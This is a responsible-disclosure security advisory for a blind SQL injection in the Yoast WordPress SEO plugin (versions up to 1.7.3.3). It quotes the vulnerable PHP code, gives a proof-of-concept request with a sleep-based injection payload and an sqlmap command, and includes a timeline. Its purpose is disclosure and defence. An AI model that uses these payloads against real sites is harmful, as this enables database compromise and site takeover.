@@ -1,0 +1,74 @@
+Title: WordPress SEO by Yoast <= 1.7.3.3 - Blind SQL Injection
+Version/s Tested: 1.7.3.3
+Patched Version: 1.7.4
+CVSSv2 Base Score: 9 (AV:N/AC:L/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C)
+CVSSv2 Temporal Score: 7 (AV:N/AC:L/Au:S/C:C/I:C/A:C/E:POC/RL:OF/RC:C)
+WPVULNDB: https://wpvulndb.com/vulnerabilities/7841
+
+Description:
+
+WordPress SEO by Yoast is a popular WordPress plugin (wordpress-seo) used
+to improve the Search Engine Optimization (SEO) of WordPress sites. The
+latest version at the time of writing (1.7.3.3) has been found to be
+affected by two authenticated (admin, editor or author user) Blind SQL
+Injection vulnerabilities. The plugin has more than one million downloads
+according to WordPress.
+
+Technical Description:
+
+The authenticated Blind SQL Injection vulnerability can be found within the
+'admin/class-bulk-editor-list-table.php' file. The orderby and order GET
+parameters are not sufficiently sanitised before being used within a SQL
+query.
+
+Line 529:
+
+$orderby = ! empty( $_GET['orderby'] ) ? esc_sql( sanitize_text_field(
+$_GET['orderby'] ) ) : 'post_title';
+
+Line 533:
+
+order = esc_sql( strtoupper( sanitize_text_field( $_GET['order'] ) ) );
+
+If the GET orderby parameter value is not empty it will pass its value
+through WordPess's own esc_sql() function. According to WordPress this
+function 'Prepares a string for use as an SQL query. A glorified
+addslashes() that works with arrays.'. However, this is not sufficient to
+prevent SQL Injection as can be seen from our Proof of Concept.
+
+Proof of Concept (PoC):
+
+The following GET request will cause the SQL query to execute and sleep for
+10 seconds if clicked on as an authenticated admin, editor or author user.
+
+http://127.0.0.1/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date%2c(select%20*%20from%20(select(sleep(10)))a)&order=asc
+
+Using SQLMap:
+
+python sqlmap.py -u "
+http://127.0.0.1/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date*&order=asc"
+--batch --technique=B --dbms=MySQL --cookie="wordpress_9d...;
+wordpress_logged_in_9dee67...;"
+
+Impact:
+
+As there is no anti-CSRF protection a remote unauthenticated attacker could
+use this vulnerability to execute arbitrary SQL queries on the victim
+WordPress web site by enticing an authenticated admin, editor or author
+user to click on a specially crafted link or visit a page they control.
+
+One possible attack scenario would be an attacker adding their own
+administrative user to the target WordPress site, allowing them to
+compromise the entire web site.
+
+Timeline:
+
+March 10th 2015 - 15:30 GMT: Vulnerability discovered by Ryan Dewhurst
+(WPScan Team - Dewhurst Security).
+March 10th 2015 - 18:30 GMT: Technical review by FireFart (WPScan Team).
+March 10th 2015 - 20:00 GMT: Vendor contacted via email.
+March 10th 2015 - 21:25 GMT: Vendor replies, confirms issue and gave
+expected patch timeline.
+March 11th 2015 - 12:05 GMT: Vendor released version 1.7.4 which patches
+this issue.
+March 11th 2015 - 12:30 GMT: Advisory released.
